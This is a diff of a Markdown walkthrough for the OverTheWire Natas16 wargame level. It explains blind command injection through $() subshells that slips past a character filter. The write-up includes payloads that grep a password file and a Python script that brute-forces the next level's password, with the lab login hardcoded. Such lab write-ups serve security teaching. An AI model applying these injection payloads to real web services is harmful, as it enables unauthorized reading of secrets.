@@ -1,6 +1,7 @@
 # 🔐 Natas16 Walkthrough
 
-This level is very similar to natas15 that we just did, but there are some more restrictions here, as the website text sugessts lets take a look at the [View sourcecode](http://natas16.natas.labs.overthewire.org/index-source.html) link and see what changed.
+This level is similar to Natas15, but now we have **extra restrictions**!  
+Check the [source code](http://natas16.natas.labs.overthewire.org/index-source.html):
 
 ```php
 <?
@@ -19,12 +20,20 @@ if($key != "") {
 }
 ?>
 ```
+## 🚫 Forbidden characters
+- `/`
+- `[]`
+- `;`
+- `|`
+- `&`
+- `'`
+- `"`
+- `\`
+- `backtick`
 
-As we can see these characters:
-`` '/[;|&`\'"]/' ``, 
- are invlaid now, rendering our last solution **useless.** But we can see that the `$` character is a valid option. That's our way around this.
+This blocks our previous command injection tricks. **BUT**, notice that `$` is **still allowed!** 💡 That’s our way in.
 
- ## Subshell
+ ## 🌀 Subshell
 
 Since `` '/[;|&`\'"]/' `` are forbidden, we can’t directly inject multiple commands. Luckily, the `$()` syntax is allowed, which executes a command inside a subshell. A ***subshell*** is a way to execute a command inside another command in the shell. Whatever the subshell outputs can then be used or appended in the outer command.
 
@@ -55,33 +64,104 @@ Since `` '/[;|&`\'"]/' `` are forbidden, we can’t directly inject multiple com
 
 ```
 
-#### For example, if we send:
-
+## 🔍 Testing a character
+Input:
 ```shell
 $(grep e /etc/natas_webpass/natas17)squid
 ```
 
-The server will run:
-```bash
-grep a /etc/natas_webpass/natas17
-```
-and append `squid` to the output.
-- If the grep finds a match (the letter `a` in the password), the output does not contain `squid`.
 
-- If the letter is not in the password, grep return nothing, and the string `squid` and other matching strings appear.
+- If **e** is in the password, squid does not appear in the output. ✅
+
+- If **e** is not, squid appears. ❌
 
 This way, we can test each possible character in the password **without using the forbidden characters.** 
 
- ## SQL injection tests
-Let's try some basic/previous inputs:
 
+***Test:***
+
+
+| INPUT    | OUTPUT |
+| -------- | ------- |
+| $(grep **e** /etc/natas_webpass/natas17)squid| None    |
+| $(grep **a** /etc/natas_webpass/natas17)squid | squid, squid's, squidded, squidding, squids    |
+
+
+
+Clearly, the password contains `e` and **doesnt** contain `a`. Now, as before we shall automate this process.
+
+## Python script
+
+This script was written with readability in mind. I've added slightly altered version of the script to this directory which has some "animations" in the console log so, feel free to use that one.
+
+```python
+import requests
+import string
+import time
+
+# =====================
+# === CONFIGURATION ===
+# =====================
+url = "http://natas16.natas.labs.overthewire.org/"
+authUsername = "natas16"
+authPassword = "hPkjKYviLQctEW33QmuXL6eDVfMW4sGo"
+
+# Possible characters in the password (letters + digits)
+charData = string.ascii_letters + string.digits
+
+# =====================================
+# === STEP 1: Find valid characters ===
+# =====================================
+
+matchingCharData = ""  # This will hold characters that exist in the password
+
+print("Step 1: Testing which characters exist in the password...\n")
+
+for i in charData:
+    # Create the payload using subshell injection.
+    # "$(grep <char> /etc/natas_webpass/natas17)squid" will execute grep on the password file.
+    # If <char> exists in the password, 'squid' will NOT appear in the response.
+    injection = f"$(grep {i} /etc/natas_webpass/natas17)squid"
+    tempUrl = f"{url}?needle={injection}&submit=Search"
+
+    # Send the HTTP GET request with basic auth
+    response = requests.get(tempUrl, auth=(authUsername, authPassword))
+
+    # Check response for presence of 'squid'
+    if 'squid' not in response.text:
+        # Character exists in the password
+        matchingCharData += i
+        print(f"Valid character found: '{i}'")
+
+print(f"\nPossible password characters: {matchingCharData}\n")
+
+# ==========================================
+# === STEP 2: Brute-force password order ===
+# ==========================================
+
+password = ""  # To build the password incrementally
+print("Step 2: Brute-forcing password character by character...\n")
+
+# Natas passwords are 32 characters long
+while len(password) < 32:
+    for char in matchingCharData:
+        # Attempt to see if the password starts with the current guess
+        attempt = password + char
+        injection = f"$(grep ^{attempt} /etc/natas_webpass/natas17)squid"
+        tempUrl = f"{url}?needle={injection}&submit=Search"
+
+        response = requests.get(tempUrl, auth=(authUsername, authPassword))
+
+        if 'squid' not in response.text:
+            # Correct next character found
+            password += char
+            print(f"Password so far: {password}")
+            break  # Move to next character
+
+# Print final password
+print(f"\nPassword for natas17: {password}")
 ```
-INPUT:
-password" OR "1
 
-OUTPUT:
-Input contains an illegal character!
-
-```
+The output should be your natas17 password! (:
 
 
